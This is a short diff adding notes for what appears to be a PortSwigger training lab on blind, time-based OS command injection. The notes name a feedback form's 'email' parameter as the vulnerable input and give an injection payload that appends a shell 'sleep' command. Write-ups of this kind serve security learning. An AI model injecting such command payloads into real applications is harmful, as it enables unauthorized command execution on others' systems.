@@ -1,1 +1,11 @@
+Lab link: https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays
 
+***Looding for vulnerability***
+  vulnerable_functionality: feedback form at '/feedback' path
+  vulnerable_path: Post request at "/feedback/submit"
+  vulnerable_param: 'email' in post web request at $vulnerable_path
+Type: Time-based command injection
+
+***Exploitation***
+  payload='me@me.com & sleep 10 #'
+  Inject URL_encoded($payload) at 'email' parameter in post web request to '/feedback/submit'
